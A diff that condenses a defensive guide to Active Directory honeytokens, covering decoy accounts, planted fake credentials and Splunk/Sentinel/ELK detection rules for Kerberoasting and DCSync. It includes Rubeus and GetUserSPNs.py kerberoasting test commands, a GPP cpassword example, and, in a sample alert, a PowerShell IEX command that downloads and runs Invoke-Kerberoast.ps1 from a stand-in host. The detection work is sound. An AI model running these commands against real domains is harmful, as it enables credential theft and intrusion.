@@ -52,7 +52,10 @@ mitre_d3fend:
 - During **incident response** to detect if attacker maintains persistence or continues reconnaissance
 - When **legacy AD environments** lack modern EDR but have log aggregation (honeytokens work with Event Viewer + Splunk/ELK)
 
-**Do not use** as sole security control (honeytokens are detection, not prevention); layer with PAM, LAPS, credential rotation, and Tier 0 segmentation.
+**Do not use** for:
+- Basic AD honeytoken deployment - use **deploying-active-directory-honeytokens** for fundamental decoy accounts, SPNs, GPO traps, and BloodHound paths with Splunk/Sentinel detection
+- This skill extends that foundation with multi-SIEM templates (Graylog, QRadar, LogRhythm, OSSIM), ACL honeypots, and DCSync/Golden Ticket detection; use the simpler skill first
+- Sole security control (honeytokens are detection, not prevention); layer with PAM, LAPS, credential rotation, and Tier 0 segmentation
 
 ## Prerequisites
 
@@ -68,286 +71,99 @@ mitre_d3fend:
 
 ### Phase 1: Design Honeytoken Strategy
 
-Plan decoy placement to maximize attacker interaction:
-
 **Honeytoken Types**:
-1. **Decoy User Accounts**: Fake users with enticing attributes (e.g., "SQL-Admin", "Backup-Admin", "VPN-Service")
-2. **Decoy SPNs**: Service Principal Names configured on decoy accounts to attract Kerberoasting
-3. **Decoy Credentials**: Fake credentials planted in scripts, config files, password managers
-4. **Decoy Group Memberships**: Honeytokens added to Domain Admins, Enterprise Admins (never used legitimately)
-5. **Decoy ACLs**: Fake GenericAll/WriteDacl permissions visible to BloodHound queries
-6. **Decoy GPOs**: Group Policy Objects that should never be accessed
+1. Decoy User Accounts (SQL-Admin, Backup-Admin)
+2. Decoy SPNs (Kerberoasting bait)
+3. Decoy Credentials (scripts, config files)
+4. Decoy ACLs (GenericAll permissions)
 
-**Naming Strategy** (appear legitimate to attackers):
-```
-GOOD Names (blend in):
-  - svc-sql-backup
-  - adm-helpdesk-tier2
-  - sqlserver-prodreader
-  - vmware-vcenter-svc
-  - backup-admin-primary
+**Naming** (blend in):
+- ✅ svc-sql-backup, adm-helpdesk-tier2, vmware-vcenter-svc
+- ❌ honeytoken-user, decoy-admin, test-honeypot
 
-BAD Names (obvious decoys):
-  - honeytoken-user
-  - decoy-admin
-  - fake-service-account
-  - test-honeypot
-```
-
-**Placement Strategy**:
-- Place in OUs attackers enumerate (Service Accounts OU, Admin Accounts OU)
-- Assign to security groups visible in `net group "Domain Admins"` output
-- Set descriptions that attract attention: "High-privilege backup account - DO NOT DISABLE"
+**Placement**: Service Accounts OU, assign to security groups, enticing descriptions.
 
 
 
 ### Phase 2: Create Decoy User Accounts
 
-Deploy honeytoken accounts with PowerShell:
-
 ```powershell
-# Create decoy service account with SPN (Kerberoasting bait)
-New-ADUser -Name "svc-sql-backup" `
-           -SamAccountName "svc-sql-backup" `
+# Create decoy service account with SPN
+New-ADUser -Name "svc-sql-backup" -SamAccountName "svc-sql-backup" `
            -UserPrincipalName "svc-sql-backup@corp.local" `
-           -Description "SQL Server backup service account - DO NOT MODIFY" `
-           -Enabled $true `
-           -PasswordNeverExpires $true `
-           -AccountPassword (ConvertTo-SecureString "NeverUsedPassword123!" -AsPlainText -Force) `
+           -Description "SQL Server backup service - DO NOT MODIFY" `
+           -Enabled $true -PasswordNeverExpires $true `
+           -AccountPassword (ConvertTo-SecureString "NeverUsedP@ss123!" -AsPlainText -Force) `
            -Path "OU=Service Accounts,DC=corp,DC=local"
 
-# Set SPN (makes account Kerberoastable)
+# Set SPN (Kerberoasting bait)
 Set-ADUser -Identity "svc-sql-backup" -ServicePrincipalNames @{Add="MSSQLSvc/sql-backup.corp.local:1433"}
 
-# Create decoy admin account
-New-ADUser -Name "adm-tier1-backup" `
-           -SamAccountName "adm-tier1-backup" `
-           -UserPrincipalName "adm-tier1-backup@corp.local" `
-           -Description "Tier 1 backup administrator account" `
-           -Enabled $true `
-           -PasswordNeverExpires $true `
-           -AccountPassword (ConvertTo-SecureString "NeverUsedPassword456!" -AsPlainText -Force) `
-           -Path "OU=Admin Accounts,DC=corp,DC=local"
-
-# Add to high-privilege group (will trigger alert if enumerated)
-Add-ADGroupMember -Identity "Domain Admins" -Members "adm-tier1-backup"
-
-# Set account to NEVER be used (flag for monitoring)
-Set-ADUser -Identity "adm-tier1-backup" -Description "HONEYTOKEN:DO_NOT_USE - Tier 1 backup administrator"
+# Add to Domain Admins
+Add-ADGroupMember -Identity "Domain Admins" -Members "svc-sql-backup"
 ```
 
-**Key Attributes**:
-- `PasswordNeverExpires = $true`: Prevents lockout from failed login attempts
-- `Enabled = $true`: Account must be active to appear in enumeration
-- Strong password: Prevents accidental compromise via password spray
-- SPN configured: Makes account vulnerable to Kerberoasting
-
-**Batch Deployment Script**:
-```powershell
-# deploy_honeytokens.ps1
-$Honeytokens = @(
-    @{Name="svc-sql-backup"; SPN="MSSQLSvc/sql-backup.corp.local:1433"; Description="SQL Server backup service"},
-    @{Name="svc-vmware-mgmt"; SPN="HTTP/vmware-mgmt.corp.local"; Description="VMware management service"},
-    @{Name="svc-backup-exec"; SPN="BackupExec/backup.corp.local"; Description="Backup Exec service account"},
-    @{Name="adm-helpdesk-tier2"; SPN=$null; Description="Tier 2 helpdesk administrator"},
-    @{Name="sqlserver-readonly"; SPN="MSSQLSvc/sqlserver-ro.corp.local:1433"; Description="SQL read-only service"}
-)
-
-foreach ($Token in $Honeytokens) {
-    Write-Host "Creating honeytoken: $($Token.Name)"
-    
-    # Create user
-    New-ADUser -Name $Token.Name `
-               -SamAccountName $Token.Name `
-               -UserPrincipalName "$($Token.Name)@corp.local" `
-               -Description $Token.Description `
-               -Enabled $true `
-               -PasswordNeverExpires $true `
-               -AccountPassword (ConvertTo-SecureString "HoneytokenP@ss$(Get-Random -Minimum 1000 -Maximum 9999)!" -AsPlainText -Force) `
-               -Path "OU=Service Accounts,DC=corp,DC=local"
-    
-    # Set SPN if specified
-    if ($Token.SPN) {
-        Set-ADUser -Identity $Token.Name -ServicePrincipalNames @{Add=$Token.SPN}
-        Write-Host "  Set SPN: $($Token.SPN)"
-    }
-    
-    # Add to Domain Admins (optional - high visibility)
-    # Add-ADGroupMember -Identity "Domain Admins" -Members $Token.Name
-    
-    Write-Host "  ✓ Created: $($Token.Name)"
-}
-
-Write-Host "`nDeployed $($Honeytokens.Count) honeytokens"
-```
+**Batch Script** (see `scripts/Deploy-Honeytokens.ps1`).
 
 ### Phase 3: Configure SIEM Alerting
 
-Create detection rules for honeytoken access:
+**Event IDs**: 4768 (TGT), 4769 (TGS/Kerberoasting), 4776 (NTLM), 4624 (logon), 4662 (LDAP)
 
-**Event IDs to Monitor**:
-- **4768**: Kerberos TGT Request (initial authentication)
-- **4769**: Kerberos Service Ticket Request (Kerberoasting detection)
-- **4776**: NTLM authentication (legacy auth attempt)
-- **4624**: Successful logon (honeytoken should NEVER log in)
-- **4625**: Failed logon (password spray detection)
-- **4662**: Operation performed on object (LDAP enumeration)
-
-**Splunk Detection Rule**:
+**Splunk**:
 ```spl
-index=wineventlog sourcetype=WinEventLog:Security
-(EventCode=4768 OR EventCode=4769 OR EventCode=4776 OR EventCode=4624)
-(TargetUserName="svc-sql-backup" OR TargetUserName="adm-tier1-backup" OR TargetUserName="svc-vmware-mgmt" OR TargetUserName="svc-backup-exec" OR TargetUserName="sqlserver-readonly")
-| eval severity="critical"
-| eval alert_message="🚨 HONEYTOKEN ACCESS DETECTED - Potential Kerberoasting or Credential Theft"
-| table _time, EventCode, TargetUserName, IpAddress, WorkstationName, SourceNetworkAddress
+index=wineventlog (EventCode=4768 OR EventCode=4769 OR EventCode=4776)
+(TargetUserName="svc-sql-backup" OR TargetUserName="adm-tier1-backup")
+| eval severity="critical", alert_message="🚨 HONEYTOKEN ACCESS"
 | sendalert email to="security-team@corp.local"
 ```
 
-**Microsoft Sentinel (KQL) Detection Rule**:
+**Microsoft Sentinel (KQL)**:
 ```kql
 SecurityEvent
 | where EventID in (4768, 4769, 4776, 4624)
-| where TargetUserName in ("svc-sql-backup", "adm-tier1-backup", "svc-vmware-mgmt", "svc-backup-exec", "sqlserver-readonly")
+| where TargetUserName in ("svc-sql-backup", "adm-tier1-backup")
 | extend AlertSeverity = "High"
-| extend AlertTitle = strcat("Honeytoken Access: ", TargetUserName, " from ", IpAddress)
-| project TimeGenerated, EventID, TargetUserName, IpAddress, WorkstationName, Computer
 ```
 
-**ELK / OpenSearch Rule**:
-```json
-{
-  "query": {
-    "bool": {
-      "must": [
-        {
-          "terms": {
-            "event.code": ["4768", "4769", "4776", "4624"]
-          }
-        },
-        {
-          "terms": {
-            "winlog.event_data.TargetUserName.keyword": [
-              "svc-sql-backup",
-              "adm-tier1-backup",
-              "svc-vmware-mgmt",
-              "svc-backup-exec",
-              "sqlserver-readonly"
-            ]
-          }
-        }
-      ]
-    }
-  },
-  "actions": {
-    "email_security_team": {
-      "email": {
-        "to": ["security-team@corp.local"],
-        "subject": "🚨 Honeytoken Access Detected",
-        "body": "Honeytoken {{ctx.payload.hits.hits.0._source.winlog.event_data.TargetUserName}} accessed from {{ctx.payload.hits.hits.0._source.source.ip}}"
-      }
-    }
-  }
-}
-```
+**Additional SIEM templates**: See `assets/siem-rules-templates.md` for Graylog, QRadar, LogRhythm, OSSIM.
 
-**Graylog Stream Rule**:
-```
-Field: EventID
-Type: match regular expression
-Value: ^(4768|4769|4776|4624)$
+### Phase 4: Detect Kerberoasting
 
-AND
+**Indicator** (Event 4769):
+- Service Name: honeytoken SPN
+- Ticket Encryption: 0x17 (RC4) = Kerberoasting
 
-Field: TargetUserName
-Type: match regular expression
-Value: ^(svc-sql-backup|adm-tier1-backup|svc-vmware-mgmt|svc-backup-exec|sqlserver-readonly)$
-```
-
-### Phase 4: Detect Kerberoasting Attacks
-
-Monitor for TGS-REQ requests targeting honeytoken SPNs:
-
-**Kerberoasting Indicator** (Event ID 4769):
-```
-Event ID: 4769 (Kerberos Service Ticket Request)
-Service Name: MSSQLSvc/sql-backup.corp.local  ← Honeytoken SPN
-Ticket Encryption Type: 0x17 (RC4-HMAC)      ← Weak encryption = Kerberoasting
-Account Name: attacker-workstation$
-```
-
-**Detection Logic**:
-1. Event 4769 for honeytoken SPN
-2. Ticket encryption type = 0x17 (RC4) or 0x12 (AES256) with SPN in honeytoken list
-3. Source workstation is NOT a legitimate admin workstation
-
-**Enhanced Splunk Detection**:
+**Splunk Detection**:
 ```spl
-index=wineventlog sourcetype=WinEventLog:Security EventCode=4769
-ServiceName="MSSQLSvc/sql-backup.corp.local" OR ServiceName="HTTP/vmware-mgmt.corp.local" OR ServiceName="MSSQLSvc/sqlserver-ro.corp.local"
-| eval is_kerberoasting=if(TicketEncryptionType="0x17", "YES", "NO")
-| where is_kerberoasting="YES"
-| stats count by _time, ServiceName, IpAddress, WorkstationName, TicketEncryptionType
-| where count > 0
-| eval alert="🚨 KERBEROASTING DETECTED - Honeytoken SPN Requested with RC4 Encryption"
+index=wineventlog EventCode=4769
+(ServiceName="MSSQLSvc/sql-backup.corp.local" OR ServiceName="HTTP/vmware-mgmt.corp.local")
+| eval is_kerberoast=if(TicketEncryptionType="0x17", "YES", "NO")
+| where is_kerberoast="YES"
 | sendalert pagerduty priority="critical"
 ```
 
-**Microsoft Defender for Identity Integration**:
-- MDI automatically flags Kerberoasting attempts against accounts with SPNs
-- Honeytokens generate alerts with "Service account queried with unusual encryption" or "Suspected Kerberos SPN exposure"
-- Configure MDI to treat ANY access to honeytoken accounts as critical severity
+**Microsoft Defender for Identity**: Automatically flags Kerberoasting against SPNs.
 
 ### Phase 5: Deploy Decoy Credentials
 
-Plant fake credentials in common attacker discovery locations:
-
-**1. Fake credentials in PowerShell history**:
+**PowerShell history**:
 ```powershell
-# Append to PowerShell history file
 $HistoryFile = (Get-PSReadlineOption).HistorySavePath
-Add-Content -Path $HistoryFile -Value '$cred = Get-Credential -UserName "svc-sql-backup" -Message "SQL Backup"'
-Add-Content -Path $HistoryFile -Value '$pass = ConvertTo-SecureString "NeverUsedPassword123!" -AsPlainText -Force'
+Add-Content -Path $HistoryFile -Value '$cred = Get-Credential -UserName "svc-sql-backup"'
 ```
 
-**2. Fake credentials in Group Policy Preferences** (classic attack vector):
+**GPP cpassword** (attackers decrypt with Get-GPPPassword):
 ```xml
-<!-- Deploy via GPO to select OUs -->
-<!-- C:\Windows\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml -->
-<Groups>
-  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="svc-sql-backup" image="2">
-    <Properties action="U" newName="" fullName="" description="SQL Backup Service" 
-                cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" 
-                userName="svc-sql-backup"/>
-  </User>
-</Groups>
-<!-- Attackers will decrypt cpassword and attempt to use credentials -->
+<!-- SYSVOL\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml -->
+<User clsid="{DF5F1855}" name="svc-sql-backup" cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"/>
 ```
 
-**3. Fake credentials in web.config / app.config files**:
-```xml
-<!-- Place in IIS application directory -->
-<configuration>
-  <connectionStrings>
-    <add name="Backup" 
-         connectionString="Server=sql-backup.corp.local;Database=Backup;User ID=svc-sql-backup;Password=NeverUsedPassword123!;" 
-         providerName="System.Data.SqlClient"/>
-  </connectionStrings>
-</configuration>
-```
-
-**4. Fake credentials in scripts**:
+**Scripts**:
 ```powershell
 # C:\Scripts\backup.ps1
-# Backup script (DO NOT DELETE)
 $username = "corp\svc-sql-backup"
-$password = ConvertTo-SecureString "NeverUsedPassword123!" -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential($username, $password)
-
-# Rest of script...
+$password = ConvertTo-SecureString "NeverUsedP@ss!" -AsPlainText -Force
 ```
-
-**Detection**: Monitor for authentication attempts using these credentials from unexpected sources.
 
 ### Phase 6: Implement ACL Honeypots
 
@@ -386,81 +202,33 @@ SubjectUserName="svc-sql-backup"
 
 ### Phase 7: Monitor for DCSync and Golden Ticket Attacks
 
-Detect replication requests from honeytoken accounts:
-
-**DCSync Detection** (Event ID 4662):
-```
-Object Type: domain
-Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes)
-             {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes-All)
-Subject: svc-sql-backup
-```
-
-**Detection Rule**:
+**DCSync Detection** (Event 4662):
 ```spl
-index=wineventlog sourcetype=WinEventLog:Security EventCode=4662
-ObjectType="domain"
+index=wineventlog EventCode=4662 ObjectType="domain"
 Properties IN ("*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*", "*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*")
-(SubjectUserName="svc-sql-backup" OR SubjectUserName="adm-tier1-backup" OR SubjectUserName="svc-vmware-mgmt")
-| eval alert="🚨 DCSYNC ATTACK DETECTED - Honeytoken Requesting AD Replication"
-| sendalert pagerduty priority="critical"
+(SubjectUserName="svc-sql-backup" OR SubjectUserName="adm-tier1-backup")
+| eval alert="🚨 DCSYNC ATTACK - Honeytoken Requesting Replication"
 ```
 
-**Golden Ticket Detection**:
-- Monitor for TGT requests (Event 4768) for honeytoken accounts with unusual ticket lifetimes (10 years)
-- Alert on TGT requests from workstations not in "Admin Workstations" group
+**Golden Ticket**: Monitor Event 4768 for unusual TGT lifetime (10 years).
 
 ### Phase 8: Test Honeytoken Effectiveness
 
-Validate detection with simulated attacks:
-
-**Test 1: Kerberoasting**:
+**Test Kerberoasting**:
 ```powershell
-# From attacker workstation (or test VM)
-# Use Rubeus or Impacket
-
-# Rubeus (Windows)
 .\Rubeus.exe kerberoast /user:svc-sql-backup /nowrap
-
-# Impacket GetUserSPNs.py (Linux)
-python3 GetUserSPNs.py -request -dc-ip 10.0.1.5 corp.local/normaluser:password
+# Or: python3 GetUserSPNs.py -request -dc-ip 10.0.1.5 corp.local/normaluser:password
 ```
+**Expected**: Event 4769 alert within seconds.
 
-**Expected Result**: Alert triggered within seconds showing Event 4769 for honeytoken SPN.
-
-**Test 2: Credential Usage**:
+**Test Credential Usage**:
 ```powershell
-# Attempt authentication with honeytoken credentials
 $cred = Get-Credential -UserName "svc-sql-backup"
-# Enter password: NeverUsedPassword123!
-
 Test-Connection -ComputerName dc01.corp.local -Credential $cred
 ```
+**Expected**: Event 4776/4768 alert.
 
-**Expected Result**: Alert triggered on Event 4776 (NTLM) or 4768 (Kerberos TGT).
-
-**Test 3: BloodHound Enumeration**:
-```powershell
-# Run SharpHound collector
-.\SharpHound.exe -c All --zipfilename bloodhound_test.zip
-
-# Import into BloodHound and search for:
-# - Shortest path to Domain Admins from honeytoken accounts
-# - Accounts with SPNs (svc-sql-backup should appear)
-```
-
-**Expected Result**: Honeytoken accounts visible in graph; any attempt to leverage them triggers alert.
-
-**Test 4: LDAP Enumeration**:
-```powershell
-# Enumerate Domain Admins group
-net group "Domain Admins" /domain
-
-# Or with PowerView
-Get-NetGroupMember -GroupName "Domain Admins"
-```
-
-**Expected Result**: Honeytoken account "adm-tier1-backup" appears in results. Accessing it triggers Event 4662.
+**Test BloodHound**: Run SharpHound, verify honeytokens visible in graph.
 
 ## Key Concepts
 
@@ -491,120 +259,66 @@ Get-NetGroupMember -GroupName "Domain Admins"
 
 ## Common Scenarios
 
-### Scenario: Detecting Post-Exploitation Reconnaissance After Phishing
+### Scenario: Post-Phishing Reconnaissance
 
-**Context**: Employee falls victim to phishing attack, attacker gains initial foothold on workstation with standard user privileges. Attacker runs BloodHound/SharpHound to map AD, discovers service account "svc-sql-backup" with SPN and "interesting" description. Attacker performs Kerberoasting using Rubeus, extracts TGS for honeytoken account. Within 30 seconds, SOC receives critical alert from SIEM.
+**Context**: Employee phished, attacker runs BloodHound, discovers honeytoken "svc-sql-backup", performs Kerberoasting. SOC receives critical alert within 30 seconds.
 
-**Approach**:
-1. **Detection**: SIEM alert fires on Event 4769 (TGS Request) for honeytoken SPN from compromised workstation
-2. **Validation**: Verify no legitimate process requested this SPN; check if workstation is admin-authorized
-3. **Containment**: Isolate compromised workstation via EDR; disable user account; reset password
-4. **Investigation**: Review PowerShell logs, process execution (Sysmon Event ID 1), network connections for C2
-5. **Forensics**: Extract Rubeus artifacts, check for credential dumping (Mimikatz, ProcDump on lsass.exe)
-6. **Eradication**: Remove persistence (scheduled tasks, registry run keys, WMI subscriptions)
-7. **Recovery**: Reimage workstation, credential rotation for exposed accounts, patch initial access vector
+**Response**:
+1. Isolate compromised workstation via EDR
+2. Disable user account, reset password
+3. Review PowerShell logs, Sysmon events, network connections
+4. Extract Rubeus artifacts, check for Mimikatz
+5. Remove persistence, reimage workstation, rotate credentials
 
-**Pitfalls**:
-- Not isolating workstation immediately (attacker may detect honeytoken trigger and pivot quickly)
-- Only rotating honeytoken password (attacker may have dumped other credentials; rotate all accounts user accessed)
-- Not analyzing full attack chain (missing lateral movement to other systems)
+### Scenario: Mass Kerberoasting
 
----
+**Context**: Automated script extracts 50+ TGS tickets including 3 honeytokens. SOC receives burst of alerts in 2-minute window.
 
-### Scenario: Detecting Kerberoasting at Scale (Automated Attack)
-
-**Context**: Attacker runs automated Kerberoasting script (Invoke-Kerberoast, GetUserSPNs.py) targeting ALL accounts with SPNs in domain. Script extracts 50+ TGS tickets including 3 honeytoken SPNs. SOC receives burst of alerts for honeytoken access within 2-minute window.
-
-**Approach**:
-1. **Detection**: Multiple Event 4769 alerts for honeytoken SPNs from same source IP/workstation
-2. **Correlation**: SIEM correlates 3 honeytoken triggers + 47 legitimate SPN requests = mass Kerberoasting
-3. **Priority Escalation**: Automated playbook escalates to Tier 2 analyst (high confidence attack)
-4. **Threat Hunting**: Identify ALL SPNs requested in attack window; correlate with EDR process execution
-5. **Credential Rotation**: Rotate passwords for ALL accounts with SPNs requested (not just honeytokens)
-6. **Hardening**: Disable RC4 encryption for Kerberos (force AES256); audit SPN assignments; remove unnecessary SPNs
-7. **Detection Enhancement**: Deploy additional honeytokens with diverse SPN types (HTTP, MSSQL, LDAP, CIFS)
-
-**Pitfalls**:
-- Focusing only on honeytokens while attacker cracks legitimate service account passwords
-- Not disabling RC4 encryption (allows offline cracking with hashcat/John)
-- Failing to audit SPN assignments (over-permissioned accounts with SPNs)
+**Response**:
+1. Correlate honeytoken + legitimate SPN requests = mass attack
+2. Identify all SPNs requested, correlate with EDR
+3. Rotate passwords for ALL requested SPNs
+4. Disable RC4 encryption, audit SPN assignments
+5. Deploy additional diverse honeytokens
 
 ## Output Format
 
 ```
 AD HONEYTOKEN DETECTION ALERT
 ==============================
-Alert ID:       SOC-2026-07-15-0042
-Timestamp:      2026-07-15 14:23:17 UTC
-Severity:       CRITICAL
-Confidence:     HIGH (Honeytoken Access = No False Positives)
+Alert ID: SOC-2026-07-15-0042 | Timestamp: 2026-07-15 14:23:17 UTC
+Severity: CRITICAL | Confidence: HIGH (No False Positives)
 
 HONEYTOKEN ACCESSED
 ━━━━━━━━━━━━━━━━━━━
-Account:        svc-sql-backup
-SPN:            MSSQLSvc/sql-backup.corp.local:1433
-Attack Type:    Kerberoasting (TGS Request with RC4 Encryption)
+Account: svc-sql-backup | SPN: MSSQLSvc/sql-backup.corp.local:1433
+Attack: Kerberoasting (TGS + RC4)
 
-SOURCE DETAILS
-━━━━━━━━━━━━━━
-Workstation:    WKS-MARKETING-042
-IP Address:     10.2.45.78
-User Context:   CORP\jdoe
-Process:        powershell.exe (PID 3842)
-Command Line:   powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.99/Invoke-Kerberoast.ps1')"
+SOURCE
+━━━━━━
+Workstation: WKS-MARKETING-042 | IP: 10.2.45.78
+User: CORP\jdoe | Process: powershell.exe (PID 3842)
+Command: powershell.exe -ep bypass -c "IEX (...Invoke-Kerberoast.ps1)"
 
 EVENT DETAILS
 ━━━━━━━━━━━━━
-Event ID:       4769 (Kerberos Service Ticket Request)
-Domain Controller: DC01.corp.local
-Ticket Encryption: 0x17 (RC4-HMAC-MD5)
-Ticket Options: 0x40810000 (Forwardable, Renewable)
+Event 4769 | DC: DC01.corp.local | Encryption: RC4-HMAC-MD5
 
 TIMELINE
 ━━━━━━━━
-14:20:15  User jdoe logs into WKS-MARKETING-042
-14:22:45  PowerShell execution: Invoke-Kerberoast.ps1 downloaded from 192.168.1.99
-14:23:12  TGS requests for 50 SPNs (including 3 honeytokens)
-14:23:17  🚨 ALERT TRIGGERED (Honeytoken svc-sql-backup accessed)
+14:20:15  jdoe logs in
+14:22:45  PowerShell downloads Invoke-Kerberoast.ps1 from 192.168.1.99
+14:23:12  TGS requests for 50 SPNs (3 honeytokens)
+14:23:17  🚨 ALERT TRIGGERED
 
-RECOMMENDED ACTIONS
-━━━━━━━━━━━━━━━━━━━
-1. [IMMEDIATE] Isolate WKS-MARKETING-042 via EDR
-2. [IMMEDIATE] Disable user account CORP\jdoe
-3. [URGENT] Rotate passwords for all SPNs requested in attack (see attached list)
-4. [URGENT] Check for lateral movement from WKS-MARKETING-042 (RDP, WMI, PsExec)
-5. [24 HOURS] Forensic analysis: memory dump, disk imaging, timeline reconstruction
-6. [48 HOURS] Disable RC4 encryption domain-wide (force AES256)
-7. [1 WEEK] Audit all SPN assignments; remove unnecessary SPNs
+ACTIONS
+━━━━━━━
+1. [NOW] Isolate WKS-MARKETING-042, disable CORP\jdoe
+2. [URGENT] Rotate ALL SPN passwords
+3. [24H] Forensics: memory dump, disk image
+4. [48H] Disable RC4 encryption domain-wide
 
-ARTIFACTS
-━━━━━━━━━
-- Kerberos TGS tickets extracted: 50 (including 3 honeytokens)
-- C2 IP identified: 192.168.1.99 (external IP, ISP: Suspicious Hosting Inc.)
-- Malicious script: Invoke-Kerberoast.ps1 (SHA256: abc123def456...)
-- PowerShell logs: Exported to \\SOC\Evidence\2026-07-15\Case-0042\
-
-IOCS
-━━━━
-C2 IP:          192.168.1.99
-C2 Domain:      attacker-c2.evil.com
-Script Hash:    abc123def456789...
-User Agent:     PowerShell/5.1.19041.1
-
-MITRE ATT&CK MAPPING
-━━━━━━━━━━━━━━━━━━━
-T1558.003       Steal or Forge Kerberos Tickets: Kerberoasting
-T1087.002       Account Discovery: Domain Account
-T1069.002       Permission Groups Discovery: Domain Groups
-
-ANALYST NOTES
-━━━━━━━━━━━━━
-High-confidence alert - honeytoken access indicates active compromise.
-User jdoe has NO legitimate reason to request TGS for svc-sql-backup.
-Recommend immediate containment and forensic investigation.
-
-Status: ESCALATED TO INCIDENT RESPONSE TEAM
-Assigned: IR-Lead-Alice
+MITRE ATT&CK: T1558.003 (Kerberoasting)
 ```
 
 ## Verification Checklist
